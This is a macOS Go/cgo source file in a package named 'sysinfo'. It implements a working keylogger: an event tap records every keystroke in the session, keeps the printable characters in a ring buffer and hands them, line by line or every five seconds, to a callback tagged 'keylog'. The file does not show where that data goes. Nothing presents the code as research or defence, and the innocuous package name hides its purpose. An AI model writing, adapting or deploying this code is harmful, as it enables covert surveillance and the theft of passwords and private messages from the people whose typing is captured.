//go:build darwin && cgo
// +build darwin,cgo

package sysinfo

/*
#cgo LDFLAGS: -framework ApplicationServices -framework Carbon
#include <ApplicationServices/ApplicationServices.h>
#include <Carbon/Carbon.h>

// Callback bridge — stores key events in a ring buffer read by Go.
// Uses a simple global array protected by the GCD main queue constraint.
#define KEYBUF_SIZE 4096
static char keyBuf[KEYBUF_SIZE];
static int keyBufHead = 0;
static int keyBufTail = 0;
static int keyBufRunning = 0;

static int keyBufLen() {
    return (keyBufHead - keyBufTail + KEYBUF_SIZE) % KEYBUF_SIZE;
}

static void keyBufPush(char c) {
    int next = (keyBufHead + 1) % KEYBUF_SIZE;
    if (next == keyBufTail) return; // full, drop
    keyBuf[keyBufHead] = c;
    keyBufHead = next;
}

static int keyBufPop(char *out, int maxLen) {
    int n = 0;
    while (keyBufTail != keyBufHead && n < maxLen) {
        out[n++] = keyBuf[keyBufTail];
        keyBufTail = (keyBufTail + 1) % KEYBUF_SIZE;
    }
    return n;
}

static CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type,
                                 CGEventRef event, void *refcon) {
    if (type == kCGEventKeyDown) {
        UniChar chars[4];
        UniCharCount len = 0;
        CGEventKeyboardGetUnicodeString(event, 4, &len, chars);
        for (UniCharCount i = 0; i < len; i++) {
            UniChar ch = chars[i];
            if (ch == '\r') ch = '\n';
            if (ch < 128) {
                keyBufPush((char)ch);
            }
        }
    }
    return event;
}

static int startEventTap() {
    if (keyBufRunning) return 0;
    CGEventMask mask = (1 << kCGEventKeyDown);
    CFMachPortRef tap = CGEventTapCreate(kCGSessionEventTap,
        kCGHeadInsertEventTap, kCGEventTapOptionListenOnly,
        mask, eventCallback, NULL);
    if (!tap) return -1;
    CFRunLoopSourceRef src = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, tap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), src, kCFRunLoopCommonModes);
    CGEventTapEnable(tap, true);
    keyBufRunning = 1;
    return 0;
}

static void runLoopOnce(double seconds) {
    CFRunLoopRunInMode(kCFRunLoopDefaultMode, seconds, true);
}
*/
import "C"

import (
	"bytes"
	"context"
	"fmt"
	"time"
	"unsafe"
)

func watchKeystrokes(ctx context.Context, onData func(data []byte, label string)) error {
	if ret := C.startEventTap(); ret != 0 {
		return fmt.Errorf("CGEventTapCreate failed (requires Accessibility permission)")
	}

	var buf bytes.Buffer
	lastFlush := time.Now()
	readBuf := make([]byte, 256)

	for {
		select {
		case <-ctx.Done():
			if buf.Len() > 0 {
				onData(buf.Bytes(), "keylog")
			}
			return ctx.Err()
		default:
		}

		C.runLoopOnce(C.double(0.1))

		n := C.keyBufPop((*C.char)(unsafe.Pointer(&readBuf[0])), C.int(len(readBuf)))
		if n == 0 {
			if time.Since(lastFlush) > 5*time.Second && buf.Len() > 0 {
				buf.WriteByte('\n')
				onData(buf.Bytes(), "keylog")
				buf.Reset()
				lastFlush = time.Now()
			}
			continue
		}

		for i := 0; i < int(n); i++ {
			ch := readBuf[i]
			if ch == '\n' {
				if buf.Len() > 0 {
					buf.WriteByte('\n')
					onData(buf.Bytes(), "keylog")
					buf.Reset()
					lastFlush = time.Now()
				}
			} else if ch >= 32 && ch < 127 {
				buf.WriteByte(ch)
			}
		}
	}
}
